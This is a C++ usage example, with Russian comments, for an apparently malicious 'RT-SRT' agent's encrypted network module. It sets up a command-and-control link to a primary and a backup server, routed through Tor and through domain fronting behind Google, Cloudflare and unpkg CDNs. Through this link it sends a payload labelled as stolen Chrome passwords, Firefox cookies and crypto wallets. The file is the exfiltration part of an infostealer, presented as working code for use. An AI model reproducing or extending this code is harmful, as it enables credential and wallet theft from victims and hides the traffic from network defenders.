// Пример использования модуля Encrypted Network Communications
// Компилировать: g++ -std=c++17 example_usage.cpp -o example

#include "agent/src/network/secure_comms.h"
#include <iostream>

int main() {
    std::cout << "=== RT-SRT Encrypted Network Communications Demo ===" << std::endl;
    
    // Получаем глобальный экземпляр SecureComms
    auto& comms = SecureNetwork::GetGlobalSecureComms();
    
    // Настройка конфигурации
    SecureNetwork::NetworkConfig config;
    config.primaryHost = "your-python-server.com";           // ← Адрес вашего Python сервера
    config.backupHost = "backup-server.com";
    config.torProxyAddress = "127.0.0.1";                   // Стандартный Tor proxy
    config.torProxyPort = 9050;
    config.connectionTimeout = 30000;                        // 30 секунд
    config.readTimeout = 15000;                              // 15 секунд
    config.enableDomainFronting = true;                      // Включить domain fronting
    config.enableTorRouting = true;                          // Включить Tor
    config.encryptionLevel = SecureNetwork::EncryptionLevel::TRIPLE_ENCRYPTION; // Максимальное шифрование
    
    // Добавляем домены для fronting
    config.domainFrontingTargets.push_back("ajax.googleapis.com");
    config.domainFrontingTargets.push_back("cdnjs.cloudflare.com");
    config.domainFrontingTargets.push_back("unpkg.com");
    
    std::cout << "Инициализация SecureComms..." << std::endl;
    
    // Инициализация
    if (!comms.Initialize(config)) {
        std::cerr << "Ошибка инициализации SecureComms!" << std::endl;
        return 1;
    }
    
    std::cout << "SecureComms успешно инициализирован!" << std::endl;
    
    // Пример 1: GET запрос
    std::cout << "\\nВыполняем GET запрос..." << std::endl;
    auto getResult = comms.GET("/api/status");
    
    if (getResult.success) {
        std::cout << "GET запрос успешен! HTTP Status: " << getResult.httpStatus << std::endl;
        std::cout << "Время отклика: " << getResult.responseTime.count() << "ms" << std::endl;
        std::cout << "Тип соединения: " << static_cast<int>(getResult.usedConnection) << std::endl;
    } else {
        std::cout << "GET запрос неуспешен: " << getResult.errorMessage << std::endl;
    }
    
    // Пример 2: POST запрос с зашифрованными данными
    std::cout << "\\nОтправляем зашифрованные данные..." << std::endl;
    
    std::string secretData = R"({
        "agent_id": "agent_001",
        "data_type": "browser_passwords",
        "timestamp": "2024-01-15T10:30:00Z",
        "payload": {
            "chrome_passwords": [...],
            "firefox_cookies": [...],
            "crypto_wallets": [...]
        }
    })";
    
    auto postResult = comms.SendEncryptedData(secretData);
    
    if (postResult.success) {
        std::cout << "Данные успешно отправлены!" << std::endl;
        std::cout << "HTTP Status: " << postResult.httpStatus << std::endl;
        std::cout << "Время отклика: " << postResult.responseTime.count() << "ms" << std::endl;
        
        // Показываем какой тип соединения использовался
        switch (postResult.usedConnection) {
            case SecureNetwork::ConnectionType::DIRECT_HTTPS:
                std::cout << "Использовано: Прямое HTTPS соединение" << std::endl;
                break;
            case SecureNetwork::ConnectionType::DOMAIN_FRONTING:
                std::cout << "Использовано: Domain Fronting через CDN" << std::endl;
                break;
            case SecureNetwork::ConnectionType::TOR_PROXY:
                std::cout << "Использовано: Tor SOCKS5 прокси" << std::endl;
                break;
            case SecureNetwork::ConnectionType::FALLBACK:
                std::cout << "Использовано: Fallback сервер" << std::endl;
                break;
            default:
                std::cout << "Использовано: Неизвестный тип соединения" << std::endl;
        }
    } else {
        std::cout << "Ошибка отправки данных: " << postResult.errorMessage << std::endl;
    }
    
    // Пример 3: Переключение методов шифрования
    std::cout << "\\nТестируем разные уровни шифрования..." << std::endl;
    
    // TLS только
    comms.UpdateConfiguration(config);
    std::cout << "Режим: TLS-только" << std::endl;
    
    // Включаем domain fronting
    comms.UseDomainFronting();
    std::cout << "Domain fronting включен" << std::endl;
    
    // Подключаемся через Tor
    if (comms.ConnectViaTor()) {
        std::cout << "Tor соединение установлено" << std::endl;
    } else {
        std::cout << "Tor недоступен (это нормально если Tor не запущен)" << std::endl;
    }
    
    std::cout << "\\n=== Демонстрация завершена ===" << std::endl;
    std::cout << "Проверьте логи в папке %TEMP% для детальной информации" << std::endl;
    
    return 0;
}